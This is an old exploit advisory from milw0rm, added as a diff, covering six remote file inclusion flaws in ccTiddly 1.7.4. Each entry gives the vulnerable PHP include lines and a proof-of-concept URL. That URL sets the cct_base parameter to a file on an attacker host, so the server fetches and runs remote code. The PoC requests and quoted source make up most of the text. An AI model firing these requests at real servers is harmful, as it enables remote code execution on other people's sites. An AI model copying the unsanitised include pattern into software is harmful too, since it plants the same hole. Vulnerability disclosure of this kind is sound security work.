@@ -1,0 +1,96 @@
+
+/*
+
+	$Id: cctiddly-1.7.4-rfi.txt,v 0.1 2008/12/04 04:12:20 cOndemned Exp $
+
+	ccTiddly 1.7.4 (cct_base) Multiple Remote File Inclusion Vulnerabilities
+	found by cOndemned
+	
+	download from : http://tiddlywiki.org/ccTiddly/ccTiddly_v1.7.4.zip
+	
+	Probably prior versions are vulnerable too...
+
+	Greetz: ZaBeaTy, str0ke, TBH, Avantura
+
+*/
+
+
+0x01 :
+	file : 
+		/index.php
+	poc : 
+		http://[host]/[cctiddly_path]/index.php?cct_base=http://[attacker]/evil.txt?
+	source :  
+
+		18.	//includes
+		19.	if(!isset($cct_base))
+		20.		$cct_base = "";
+		21.
+		22.	include_once($cct_base."includes/header.php");
+		23.	include_once($cct_base."includes/login.php");	
+	
+0x02 :
+
+	file :
+		/handle/proxy.php
+	poc :
+		http://[host]/[cctiddly_path]/handle/proxy.php?cct_base=http://[attacker]/evil.txt?
+	source :
+
+		3.	if(!isset($cct_base)) 
+		4.		$cct_base= "../";
+		5.	include_once($cct_base."includes/header.php");
+		6.	include_once($cct_base."includes/config.php");
+
+0x03 :
+
+	file :
+		/includes/header.php
+	poc :
+		http://[host]/[cctiddly_path]/handle/includes/header.php?cct_base=http://[attacker]/evil.txt?
+	source :
+
+		5.	if(!isset($cct_base)) 
+		6.		$cct_base= "";
+		7.	include_once($cct_base."includes/functions.php");
+		8.	include_once($cct_base."includes/config.php");
+		9.	include_once($cct_base."includes/pluginLoader.php");
+		10.	include_once($cct_base."lang/".$tiddlyCfg['pref']['language']."/language.php");
+		11.	//include is used because language file is included once in config.php file
+		12.	include_once($cct_base."includes/tiddler.php");
+		13.	include_once($cct_base."includes/user.php");
+
+0x04 :
+
+	file :
+		/includes/include.php
+	poc :
+		http://[host]/[cctiddly_path]/includes/include.php?cct_base=http://[attacker]/evil.txt?
+	source :
+
+		3.	include_once($cct_base."includes/ccAssignments.php");
+
+0x05 :
+
+	file :
+		/includes/workspace.php	
+	poc :
+		http://[host]/[cctiddly_path]/includes/workspace.php?cct_base=http://[attacker]/evil.txt?
+	source :
+		3.	include_once($cct_base."includes/header.php");
+		4.	include_once($cct_base."includes/user.php");
+		5.	include_once($cct_base."includes/tiddler.php");
+
+0x06 :
+
+	file :
+		/plugins/RSS/files/rss.php
+	poc :
+		http://[host]/[cctiddly_path]/plugins/RSS/files/rss.php?cct_base=http://[attacker]/evil.txt?
+	source :
+
+		3.	include_once($cct_base."includes/header.php");
+		
+EoF.
+
+# milw0rm.com [2008-12-04]
